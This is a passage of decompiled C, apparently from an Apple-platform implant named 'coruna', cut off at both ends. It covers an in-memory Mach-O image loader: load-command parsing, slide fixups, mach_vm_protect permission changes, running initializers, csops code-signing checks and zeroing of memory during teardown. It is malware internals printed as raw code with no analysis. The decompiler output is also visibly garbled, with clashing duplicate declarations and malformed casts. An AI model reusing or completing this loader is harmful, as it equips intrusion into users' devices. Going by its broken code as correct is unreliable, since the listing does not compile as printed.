    u = 0x12001;
  }
  return u;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_5(long *handle,uint64_t val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) & 1) == 0) {
      u = 0;
    }
    else {
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_1e8c8;
      thread_attr = coruna_implant65fc_residual_112;
      host_info = &k_implant_rodata_word_201c8;
      serial_buf = val;
      action = handle;
      u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    }
  }
  return u;
}





uint64_t coruna_implant65fc_residual_112(long handle,long addr_2)
{
  uint *ptr;
  uint64_t u;
  long handle;
  long addr;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long type_id;
  
  port = addr_2 + 0x48;
  tag = port + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  if (port < tag) {
    do {
      if (*(char *)(port + 0x40) == '\x16') {
        kind = *(unsigned long *)(port + 0x28);
        if (kind < 4) goto fail;
        addr = *(long *)(handle + 0x28);
        ptr = (uint *)(*(long *)(addr + 0x18) + *(long *)(port + 0x20));
        type_id = *(unsigned long *)(addr + 0x40);
        version = type_id + *ptr;
        if (version < type_id || *(long *)(addr + 0x48) + type_id <= version) {
          return 0x12008;
        }
        version = 1;
        while (u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))(),
              (int)u == 0 && version < kind >> 2) {
          size = *(unsigned long *)(*(long *)(handle + 0x28) + 0x40);
          type_id = size + ptr[version];
          version = (unsigned long)((int)version + 1);
          if (type_id < size || *(long *)(*(long *)(handle + 0x28) + 0x48) + size <= type_id) {
            return 0x12008;
          }
        }
      }
      else {
        if (*(char *)(port + 0x40) == '\t') {
          handle = *(long *)(handle + 0x28);
          addr = 2;
          if (*(char *)(handle + 0x90) != '\0') {
            addr = 3;
          }
          kind = *(unsigned long *)(port + 0x28) >> addr;
          if (kind != 0) {
            version = 0;
            addr = *(long *)(handle + 0x18) + *(long *)(port + 0x20);
            type_id = 1;
            if (*(char *)(handle + 0x90) == '\0') goto done;
            do {
              size = *(unsigned long *)(addr + version * 8);
              version = type_id;
              while( true ) {
                if (size < *(unsigned long *)(handle + 0x40) ||
                    *(long *)(handle + 0x48) + *(unsigned long *)(handle + 0x40) <= size) {
                  return 0x12008;
                }
                u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))();
                if ((int)u != 0 || kind <= version) goto cleanup;
                handle = *(long *)(handle + 0x28);
                type_id = (unsigned long)((int)version + 1);
                if (*(char *)(handle + 0x90) != '\0') break;
done:
                size = (unsigned long)*(uint *)(addr + version * 4);
                version = type_id;
              }
            } while( true );
          }
        }
fail:
        u = 0;
      }
cleanup:
      port = port + 0x50;
    } while ((int)u == 0 && port < tag);
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_block_assign_119d8(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),7);
  return;
}





void coruna_block_dispose_119e8(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),7);
  return;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_6(long *handle,uint64_t val)
{
  uint32_t u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  size = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) >> 2 & 1) == 0) {
      size = 0;
    }
    else {
      u = 0x11;
      if ((char)handle[0x12] != '\0') {
        u = 0x1a;
      }
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_1e8c8;
      thread_attr = coruna_implant65fc_residual_113;
      host_info = &k_implant_rodata_word_201f8;
      serial_buf = val;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,u,&scratch);
    }
  }
  return size;
}





uint64_t coruna_implant65fc_residual_113(long handle,long addr_2)
{
  uint64_t u;
  long handle;
  unsigned long size;
  
  handle = *(long *)(handle + 0x28);
  if (*(char *)(handle + 0x90) == '\0') {
    size = (unsigned long)*(uint *)(addr_2 + 8);
  }
  else {
    size = *(unsigned long *)(addr_2 + 8);
  }
  size = *(long *)(handle + 0x50) + size;
  if (size < *(unsigned long *)(handle + 0x40) ||
      *(long *)(handle + 0x48) + *(unsigned long *)(handle + 0x40) <= size) {
    return 0x12008;
  }
  u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))();
  return u;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_7(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x42) == 2) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_return_zero_11b5c;
    host_info = &k_implant_rodata_word_20228;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_return_zero_11b5c(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  void *ptr;
  unsigned long port;
  uint tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  
  u = addr_2 + 0x48;
  kind = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (kind <= u) {
      return 0;
    }
    if ((*(char *)(u + 0x40) == '\n') && (type_id = *(unsigned long *)(u + 0x28), 7 < type_id)) {
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0x10) < 0) {
        return 0x12009;
      }
      size = *(long *)(handle + 0x18) + *(long *)(u + 0x20);
      port = *(unsigned long *)(handle + 8);
      version = port + *(long *)(handle + 0x10);
      if (size < port || version <= size) {
        return 0x12009;
      }
      if ((long)type_id < 0) {
        return 0x12009;
      }
      if (size + type_id < port || version < size + type_id) {
        return 0x12009;
      }
      if (size == 0) {
        return 0xad001;
      }
      ptr = _realloc(*(void **)(handle + 200),
                        (type_id & 0xfffffffffffffff8) + (unsigned long)(uint)(*(int *)(handle + 0xd0) << 3));
      if (ptr == (void *)0x0) {
        return 0xad009;
      }
      type_id = type_id >> 3;
      *(void **)(handle + 200) = ptr;
      tag = *(uint *)(handle + 0xd0) + 1;
      *(uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xd0) * 8) =
           *(uint64_t *)(size + (type_id - 1) * 8);
      if (type_id - 1 != 0) {
        do {
          *(uint64_t *)(*(long *)(handle + 200) + (unsigned long)tag * 8) =
               *(uint64_t *)((size - 0x10) + type_id * 8);
          tag = tag + 1;
          type_id = type_id - 1;
        } while (type_id != 1);
      }
      *(uint *)(handle + 0xd0) = tag;
    }
    u = u + 0x50;
  } while( true );
}





uint64_t coruna_implant65fc_via_implant65fc_via_fixup_slide_base(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    return 0xad001;
  }
  if ((*(long *)(handle + 0x188) == 0) && (*(long *)(handle + 0x198) == 0)) {
    if (*(char *)(handle + 0x138) != '\0') {
      return 0x910016;
    }
    u = coruna_implant65fc_via_fixup_slide_base();
    return u;
  }
  u = coruna_bzero_4();
  return u;
}





uint32_t coruna_implant65fc_residual_114(long handle)
{
  uint32_t u;
  
  u = 0xad001;
  if (handle != 0) {
    u = 0;
  }
  return u;
}





uint64_t coruna_bzero_19b24(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    if (((*(char *)(handle + 0x110) == '\0') && (*(void **)(handle + 0x100) != (void *)0x0)) &&
       (*(size_t *)(handle + 0x108) != 0)) {
      _bzero(*(void **)(handle + 0x100),*(size_t *)(handle + 0x108));
    }
    u = 0;
  }
  return u;
}





long * coruna_macho_open_image(long handle,uint size,long addr_2,int flags,uint8_t buf)
{
  long *ptr;
  
  ptr = (long *)0x0;
  if ((((handle != 0) && (size != 0)) && (addr_2 != 0)) &&
     (((flags != 0 && (flags != -1)) && (ptr = _calloc(0x1c8,1), ptr != (long *)0x0)))) {
    ptr[0x29] = handle;
    ptr[0x2a] = (unsigned long)size;
    *ptr = addr_2;
    *(int *)(ptr + 0xb) = flags;
    *(uint32_t *)(ptr + 4) = *(uint32_t *)k_implant_mach_task_self_slot;
    *(uint8_t *)(ptr + 0x27) = buf;
    *(uint8_t *)((long)ptr + 0xfc) = 1;
    *(uint8_t *)((long)ptr + 0x1c3) = 1;
    *(uint8_t *)(ptr + 0x12) = 1;
  }
  return ptr;
}





uint64_t coruna_ctx_free_11dc8(uint64_t *val)
{
  uint64_t u;
  
  if (val != (uint64_t *)0x0) {
    u = coruna_mach_vm_deallocate_11e48();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x29] = 0;
    val[0x28] = 0;
    val[0x2b] = 0;
    val[0x2a] = 0;
    val[0x2d] = 0;
    val[0x2c] = 0;
    val[0x2f] = 0;
    val[0x2e] = 0;
    val[0x31] = 0;
    val[0x30] = 0;
    val[0x33] = 0;
    val[0x32] = 0;
    val[0x35] = 0;
    val[0x34] = 0;
    val[0x37] = 0;
    val[0x36] = 0;
    val[0x38] = 0;
    _free(val);
    return u;
  }
  return 0xad001;
}





int coruna_mach_vm_deallocate_11e48(long *handle)
{
  int err;
  void (*ptr)(void);
  bool err;
  uint8_t *ptr;
  kern_return_t lk5;
  int status;
  int flags;
  int count;
  int idx;
  long handle;
  void (*buf)(void);
  long *ptr;
  long addr;
  unsigned long u;
  long off;
  unsigned long size;
  unsigned long scratch;
  long bootargs;
  
  idx = 0xad001;
  if ((handle == (long *)0x0) || (*handle == 0)) {
    return 0xad001;
  }
  if ((char)handle[0x27] != '\0') {
    if (((*(char *)((long)handle + 0xfb) == '\0') || (handle[8] == 0)) || (handle[9] == 0)) {
      status = 0;
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)(handle + 0xb),handle[8],handle[9]);
      status = 0;
      if (lk5 != 0) {
        status = 0x14011;
      }
    }
    goto fail;
  }
  if (*(char *)((long)handle + 0xf9) == '\0') {
done:
    status = 0;
    err = true;
  }
  else {
    if (k_implant_cxa_finalize_ranges_slot == (uint8_t *)0x0) {
      ___cxa_finalize(handle[8]);
    }
    else {
      scratch = handle[8];
      bootargs = handle[9];
      ___cxa_finalize_ranges(&scratch,1);
    }
    if ((int)handle[0x1a] == 0) goto done;
    size = 0;
    do {
      buf = *(void (**)(handle[0x19] + size * 8);
      ptr = (void (*)handle[1];
      err = ptr <= buf && buf < ptr + handle[2];
      if (ptr > buf || buf >= ptr + handle[2]) {
        status = 0x12009;
        flags = status;
        if (((char)handle[0x1f] != '\0') && (flags = coruna_implant65fc_via_macho_text_seg(*handle,handle,0x3c), !err)) {
        flags = status;
        }
        status = coruna_munmap(handle);
        if (flags != 0) {
        status = flags;
        }
      }
      (*buf)();
      size = size + 1;
    } while (size < *(uint *)(handle + 0x1a));
    status = 0;
  }
cleanup:
  flags = status;
  if (((char)handle[0x1f] != '\0') && (flags = coruna_implant65fc_via_macho_text_seg(*handle,handle,0x3c), !err)) {
    flags = status;
  }
  status = coruna_munmap(handle);
  if (flags != 0) {
    status = flags;
  }
fail:
  ptr = k_implant_mach_task_self_slot;
  flags = status;
  if (((*(char *)((long)handle + 0xfa) != '\0') && (handle[1] != 0)) && (handle[2] != 0)) {
    if ((int)handle[0x11] == 0) {
      flags = 0;
    }
    else {
      off = 0;
      size = 0;
      count = 0;
      do {
        scratch = scratch & 0xffffffffffffff00;
        flags = coruna_mach_vm_protect_fec8(*handle,*(uint32_t *)ptr,*(uint64_t *)(handle[0x10] + off),
                             ((uint64_t *)(handle[0x10] + off))[1],3,&scratch);
        err = 0x1400e;
        if ((char)scratch != '\0') {
          err = 0;
        }
        if (flags != 0) {
          err = flags;
        }
        flags = err;
        if (count != 0) {
          flags = count;
        }
        if (err != 0) break;
        _bzero(*(void **)(handle[0x10] + off),((uint64_t *)(handle[0x10] + off))[1]);
        size = size + 1;
        off = off + 0x18;
        count = flags;
      } while (size < *(uint *)(handle + 0x11));
    }
    count = flags;
    if ((char)handle[0xf] == '\0') {
      if (((char)handle[0x1f] != '\0') && (count = coruna_objc_metaclass_prefix(handle), flags != 0)) {
        count = flags;
      }
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)ptr,handle[1],handle[2]);
      err = 0x1400c;
      if (flags != 0) {
        err = flags;
      }
      if (lk5 != 0) {
        count = err;
      }
    }
    *(uint8_t *)(handle + 0xf) = 0;
    *(uint8_t *)((long)handle + 0xfa) = 0;
    handle[1] = 0;
    handle[2] = 0;
    ptr = (long *)*handle;
    if (ptr != (long *)0x0) {
      off = *ptr;
      if (((off == 0) || (*(void (**)(off + 0x28) == (void (*)0x0)) || (ptr[1] == 0)) {
        idx = 0;
      }
      else {
        idx = (**(void (**)(off + 0x28))(off,ptr[1],0xc,(int)handle[0xb]);
      }
    }
    if (count != 0) {
      idx = count;
    }
    flags = idx;
    if (status != 0) {
      flags = status;
    }
    if ((void *)handle[0x10] != (void *)0x0) {
      _free((void *)handle[0x10]);
    }
  }
  if ((*(uint *)(handle + 0x16) != 0) && ((void *)handle[0x15] != (void *)0x0)) {
    _bzero((void *)handle[0x15],(unsigned long)*(uint *)(handle + 0x16) << 4);
    _free((void *)handle[0x15]);
  }
  *(uint32_t *)(handle + 0x16) = 0;
  handle[0x15] = 0;
  if (((*(char *)((long)handle + 0xc4) == '\0') && (*(uint *)(handle + 0x18) != 0)) &&
     ((void *)handle[0x17] != (void *)0x0)) {
    _bzero((void *)handle[0x17],(unsigned long)*(uint *)(handle + 0x18));
    _free((void *)handle[0x17]);
  }
  handle[0x17] = 0;
  *(uint32_t *)(handle + 0x18) = 0;
  *(uint8_t *)((long)handle + 0xc4) = 0;
  if ((void *)handle[0x19] != (void *)0x0) {
    _free((void *)handle[0x19]);
  }
  ptr = (long *)handle[0x1b];
  if (ptr != (long *)0x0) goto check_ok;
  while (ptr = (long *)handle[0x28], ptr != (long *)0x0) {
    handle[0x28] = *ptr;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
check_ok:
    _free(ptr);
  }
  size = (unsigned long)*(uint *)(handle + 0x14);
  if ((*(uint *)(handle + 0x14) != 0) && (off = handle[0x13], off != 0)) {
    addr = 0;
    u = 1;
    while( true ) {
      handle = *(long *)(off + addr + 8);
      if ((handle != 0) && (*(void (**)(handle + 8) != (void (*)0x0)) {
        (**(void (**)(handle + 8))(handle,*(uint64_t *)(off + addr));
        size = (unsigned long)*(uint *)(handle + 0x14);
      }
      if (size <= u) break;
      off = handle[0x13];
      u = u + 1;
      addr = addr + 0x10;
    }
    _free((void *)handle[0x13]);
  }
  handle[0x28] = 0;
  handle[0x25] = 0;
  handle[0x24] = 0;
  handle[0x27] = 0;
  handle[0x26] = 0;
  handle[0x21] = 0;
  handle[0x20] = 0;
  handle[0x23] = 0;
  handle[0x22] = 0;
  handle[0x1d] = 0;
  handle[0x1c] = 0;
  handle[0x1f] = 0;
  handle[0x1e] = 0;
  handle[0x19] = 0;
  handle[0x18] = 0;
  handle[0x1b] = 0;
  handle[0x1a] = 0;
  handle[0x15] = 0;
  handle[0x14] = 0;
  handle[0x17] = 0;
  handle[0x16] = 0;
  handle[0x11] = 0;
  handle[0x10] = 0;
  handle[0x13] = 0;
  handle[0x12] = 0;
  handle[0xd] = 0;
  handle[0xc] = 0;
  handle[0xf] = 0;
  handle[0xe] = 0;
  handle[9] = 0;
  handle[8] = 0;
  handle[0xb] = 0;
  handle[10] = 0;
  handle[5] = 0;
  handle[4] = 0;
  handle[7] = 0;
  handle[6] = 0;
  handle[1] = 0;
  *handle = 0;
  handle[3] = 0;
  handle[2] = 0;
  return flags;
}





uint64_t coruna_implant65fc_via_mach_vm_protect_fec8(uint64_t *val)
{
  int err;
  
  if (val != (uint64_t *)0x0) {
    if ((((*(char *)(val + 0x26) == '\0') && (val[0x25] != 0)) && (val[0x23] != 0)) &&
       (err = coruna_mach_vm_protect_fec8(*val,*(uint32_t *)k_implant_mach_task_self_slot,val[0x23],
                             val[0x25],3,0), err == 0)) {
      _bzero((void *)val[0x23],val[0x25]);
      val[0x23] = 0;
      val[0x24] = 0;
      val[0x25] = 0;
    }
    val[0x36] = 0;
    val[0x35] = 0;
    val[0x38] = 0;
    val[0x37] = 0;
    val[0x32] = 0;
    val[0x31] = 0;
    val[0x34] = 0;
    val[0x33] = 0;
    val[0x2e] = 0;
    val[0x2d] = 0;
    val[0x30] = 0;
    val[0x2f] = 0;
    val[0x2a] = 0;
    val[0x29] = 0;
    val[0x2c] = 0;
    val[0x2b] = 0;
    *(uint8_t *)((long)val + 0xfc) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_via_parse_xnu_processors_13d28(long handle,long addr_2,uint64_t val,uint size,long *off_3)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t port;
  char scratch;
  
  port = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && ((int)val != 0)) && (off_3 != (long *)0x0)) {
    scratch = '\x01';
    port = coruna_parse_xnu_processors_13d28(&scratch);
    if ((int)port == 0) {
      if (scratch == '\0') {
        handle = coruna_macho_open_image(addr_2,val,handle,*(uint32_t *)k_implant_mach_task_self_slot,0)
        ;
        if (handle == 0) {
          port = 0x12002;
        }
        else {
          version = 0;
          *(byte *)(handle + 0x110) = (byte)size & 1;
          *(bool *)(handle + 0x130) = (size & 5) != 0;
          *(byte *)(handle + 0x1c3) = ((byte)((size & 0xff) >> 1) ^ 0xff) & 1;
          *(byte *)(handle + 0x1c4) = (byte)((size & 0xff) >> 4) & 1;
          size = 0xf;
          if ((size & 4) == 0) {
            size = 0x10;
          }
          do {
            u = version + 1;
            port = (*(void (*)(&k_implant_rodata_word_20248)[version])(handle);
            version = u;
          } while ((int)port == 0 && u < size);
          if ((int)port == 0) {
            *off_3 = handle;
          }
          else {
            coruna_ctx_free_11dc8(handle);
          }
        }
      }
      else {
        port = 0xad008;
      }
    }
  }
  return port;
}





uint64_t coruna_implant65fc_via_implant65fc_via_macho_text_seg(long *handle)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if (*(char *)((long)handle + 0x79) == '\0') {
      u = 0;
    }
    else {
      u = coruna_implant65fc_via_macho_foreach_loadcmd(*handle,handle);
      if ((int)u == 0) {
        u = coruna_implant65fc_via_macho_text_seg(*handle,handle,0x28);
        *(bool *)(handle + 0x1f) = (int)u == 0;
        *(uint8_t *)(handle + 0xf) = 0;
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_8(long *handle)
{
  ushort u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long *serial_buf;
  long *action;
  
  if (handle == (long *)0x0) {
    return 0xad001;
  }
  if (*handle == 0) {
fail:
    size = 0xad001;
  }
  else {
    u = *(ushort *)(handle + 0x38);
    if ((u >> 2 & 1) != 0) {
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_1e8b0;
      thread_attr = coruna_implant65fc_residual_116;
      host_info = &k_implant_rodata_word_20318;
      serial_buf = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x1a,&scratch);
      if ((int)size != 0) {
        return size;
      }
      if (*handle == 0) goto fail;
      u = *(ushort *)(handle + 0x38);
    }
    if ((u & 1) != 0) {
      serial_buf = (long *)handle[3];
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_1e8b0;
      thread_attr = coruna_return_zero_12e78;
      host_info = &k_implant_rodata_word_20338;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      if ((int)size != 0) {
        return size;
      }
    }
    size = 0;
    *(uint8_t *)((long)handle + 0xf9) = 1;
  }
  return size;
}





uint64_t coruna_implant65fc_via_ctx_free_11dc8(long handle,long addr_2,int flags,uint size,long *off_3)
{
  int err;
  bool err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) {
    err = 0xfffffff;
    if (flags != 0) {
      err = flags;
    }
    handle = coruna_macho_open_image(addr_2,err,handle,*(uint32_t *)k_implant_mach_task_self_slot,0);
    if (handle == 0) {
      u = 0x12002;
    }
    else {
      *(uint16_t *)(handle + 0x1c2) = 1;
      *(uint8_t *)(handle + 0x110) = 1;
      *(uint8_t *)(handle + 0x130) = 1;
      *(byte *)(handle + 0x1c4) = (byte)(size >> 4) & 1;
      size = 0;
      do {
        u = (*(void (*)(&k_implant_rodata_word_202c8)[size])(handle);
        err = size < 3;
        size = size + 1;
      } while ((int)u == 0 && err);
      if ((int)u == 0) {
        *off_3 = handle;
      }
      else {
        coruna_ctx_free_11dc8(handle);
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_ctx_free_11dc8_2(void *ctx)
{
  uint64_t u;
  
  if (ctx == (void *)0x0) {
    u = 0xad001;
  }
  else {
    if (*(char *)((long)ctx + 0xfc) == '\0') {
      coruna_mach_vm_deallocate_11e48(ctx);
      _free(ctx);
    }
    else {
      coruna_ctx_free_11dc8(ctx);
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_resolve_libcache_sym(uint64_t *val,short *arg,long handle,char *path)
{
  char *ptr;
  int *err;
  bool err;
  bool status;
  int err;
  uint64_t *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  unsigned long u;
  int *status;
  uint64_t size;
  long scratch;
  
  size = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) {
    ptr = "\x01";
    if (path != (char *)0x0) {
      ptr = path;
    }
    ptr = _calloc(1,0x178);
    if (ptr == (uint64_t *)0x0) {
      size = 0xad009;
    }
    else {
      handle = __NSGetMachExecuteHeader();
      ptr[0x19] = handle;
      addr = __NSGetArgc();
      ptr[0x1a] = addr;
      off = __NSGetArgv();
      ptr[0x1b] = off;
      base = __NSGetEnviron();
      ptr[0x1c] = base;
      ctx_val = __NSGetProgname();
      ptr[0x1d] = ctx_val;
      if ((((handle == 0) || (addr == 0)) || (off == 0)) || (base == 0)) {
        size = 0x1200f;
      }
      else {
        size = 0x1200f;
        if ((ctx_val != 0) && (size = coruna_csops_128d4((long)ptr + 0x1d), (int)size == 0)) {
          if ((*ptr == '\0') || (err = coruna_dladdr_142c0(), err != 0)) {
            u = coruna_identity_6080(k_implant_dladdr_slot);
            err = (int *)(u & 0xfffffffffffff000);
            do {
              status = err;
              err = status + -0x400;
            } while (*status != -0x1120531);
            *(uint *)(ptr + 3) = status[2] & 0xffffff;
            err = arg != (short *)0x0;
            status = handle == 0;
            scratch = handle;
            if ((!err || !status) ||
               (size = (**(void (**)(arg + 0xc))(arg,0,&scratch), (int)size == 0)) {
              *ptr = arg;
              ptr[1] = scratch;
              *(bool *)(ptr + 2) = err && status;
              *(char *)((long)ptr + 0x1c) = *ptr;
              size = _dlopen("/usr/lib/system/libcache.dylib",0x12);
              ptr[4] = size;
              size = coruna_load_libobjc_path(ptr);
              if ((int)size == 0) {
                size = coruna_task_info(ptr);
                if ((int)size == 0) {
                  *val = ptr;
                  return size;
                }
                coruna_pthread_mutex_destroy(ptr);
              }
              if (err && status) {
                (**(void (**)(arg + 0x10))(arg,ptr[1]);
                ptr[1] = 0;
              }
            }
          }
          else {
            size = 0x12010;
          }
        }
      }
      _free(ptr);
    }
  }
  return size;
}





void coruna_csops_128d4(byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  if (k_implant_rodata_word_1e888 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp1 = _getpid();
    err = _csops(lp1,0,scratch,4);
    if (err < 0) goto fail;
    err = bootargs >> 5 & 1;
  }
  else {
    lp1 = _getpid();
    err = _csops(lp1,5,&thread_attr,0x14);
    if (err < 0) {
      err = ___error();
      if (*err == 0x55) {
        u = 0;
        *arg = 0;
        if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return;
        }
        ___stack_chk_fail(u);
      }
fail:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = 1;
  }
  u = 0;
  *arg = err;
done:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_ctx_free_129d0(long *arg)

{
  uint u;
  unsigned long size;
  long off;
  
  if (arg == (long *)0x0) {
    size = 0xad001;
  }
  else {
    size = coruna_pthread_mutex_destroy();
    if (((char)arg[2] != '\0') && (off = *arg, off != 0)) {
      u = (**(void (**)(off + 0x20))(off,arg[1]);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
    }
    arg[0x2e] = 0;
    arg[0x2b] = 0;
    arg[0x2a] = 0;
    arg[0x2d] = 0;
    arg[0x2c] = 0;
    arg[0x27] = 0;
    arg[0x26] = 0;
    arg[0x29] = 0;
    arg[0x28] = 0;
    arg[0x23] = 0;
    arg[0x22] = 0;
    arg[0x25] = 0;
    arg[0x24] = 0;
    arg[0x1f] = 0;
    arg[0x1e] = 0;
    arg[0x21] = 0;
    arg[0x20] = 0;
    arg[0x1b] = 0;
    arg[0x1a] = 0;
    arg[0x1d] = 0;
    arg[0x1c] = 0;
    arg[0x17] = 0;
    arg[0x16] = 0;
    arg[0x19] = 0;
    arg[0x18] = 0;
    arg[0x13] = 0;
    arg[0x12] = 0;
    arg[0x15] = 0;
    arg[0x14] = 0;
    arg[0xf] = 0;
    arg[0xe] = 0;
    arg[0x11] = 0;
    arg[0x10] = 0;
    arg[0xb] = 0;
    arg[10] = 0;
    arg[0xd] = 0;
    arg[0xc] = 0;
    arg[7] = 0;
    arg[6] = 0;
    arg[9] = 0;
    arg[8] = 0;
    arg[3] = 0;
    arg[2] = 0;
    arg[5] = 0;
    arg[4] = 0;
    arg[1] = 0;
    *arg = 0;
    _free(arg);
  }
  return size;
}





uint64_t coruna_implant65fc_residual_115(long *handle,long addr_2,long off_3)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != 0)) {
    scratch = off_3;
    if ((off_3 != 0) ||
       (u = (**(void (**)(addr_2 + 0x18))(addr_2,0,&scratch), (int)u == 0)) {
      handle = *handle;
      if ((handle != 0) && ((char)handle[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,handle[1]);
      }
      *handle = addr_2;
      handle[1] = scratch;
      *(bool *)(handle + 2) = off_3 == 0;
      if (((int)handle[10] != 2) || (u = coruna_implant65fc_via_implant65fc_via_implant65fc_via_mach_vm_region_recurse(handle,handle + 0xb), (int)u == 0))
      {
        if ((int)handle[0x23] == 1) {
          u = coruna_implant65fc_via_implant65fc_via_implant65fc_via_mach_vm_region_recurse_2(handle,handle + 0x24);
        }
        else {
          u = 0;
        }
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_9(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if (*(char *)(handle + 0xfc) == '\0') {
    u = 0x12012;
  }
  else {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_macho_pagezero_1300c;
    host_info = &k_implant_rodata_word_20358;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_csops_12bb0(long *handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad00a;
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
